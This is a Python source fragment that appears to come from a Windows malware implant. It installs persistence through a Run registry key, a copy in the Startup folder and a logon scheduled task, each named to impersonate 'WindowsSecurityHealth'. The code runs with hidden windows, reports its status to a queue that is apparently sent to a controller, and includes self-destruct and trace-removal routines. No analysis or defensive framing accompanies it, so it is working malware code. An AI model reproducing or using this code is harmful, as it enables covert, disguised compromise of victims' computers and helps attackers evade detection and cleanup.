def f_self():
    p = G.get("self") or sys.executable
    return p


def f_runkey():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsSecurityHealth", 0, winreg.REG_SZ, '"' + f_self() + '"')
        winreg.CloseKey(k)
        return True
    except Exception as e:
        f_log("run.log", "runkey: " + repr(e))
        return False


def f_startup():
    try:
        d = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        os.makedirs(d, exist_ok=True)
        shutil.copy2(f_self(), os.path.join(d, "WindowsSecurityHealth.exe"))
        return True
    except Exception as e:
        f_log("run.log", "startup: " + repr(e))
        return False


def f_task():
    try:
        r = subprocess.run(["schtasks", "/create", "/tn", "MicrosoftWindowsSecurityHealth",
                            "/tr", '"' + f_self() + '"', "/sc", "onlogon", "/f"],
                           capture_output=True, text=True, timeout=30, creationflags=0x08000000)
        return r.returncode == 0
    except Exception as e:
        f_log("run.log", "task: " + repr(e))
        return False


def f_persist():
    res = {"run": f_runkey(), "startup": f_startup(), "task": f_task()}
    G["persist"] = res
    f_log("run.log", "persist " + str(res))
    f_queue({"t": "persist", "res": res})


def f_unpersist():
    r = {}
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "WindowsSecurityHealth")
        winreg.CloseKey(k)
        r["run"] = True
    except Exception:
        r["run"] = False
    try:
        os.remove(os.path.join(os.environ["APPDATA"],
                               r"Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealth.exe"))
        r["startup"] = True
    except Exception:
        r["startup"] = False
    try:
        subprocess.run(["schtasks", "/delete", "/tn", "MicrosoftWindowsSecurityHealth", "/f"],
                       capture_output=True, timeout=20, creationflags=0x08000000)
        r["task"] = True
    except Exception:
        r["task"] = False
    f_queue({"t": "persist", "res": r, "removed": True})
    return r


def f_selfdestruct():
    f_unpersist()
    d = f_appdir()
    subprocess.Popen(["cmd", "/c", "timeout /t 3 >nul & rd /s /q \"" + d + "\""],
                     creationflags=0x08000000)
    time.sleep(0.5)
    os._exit(0)
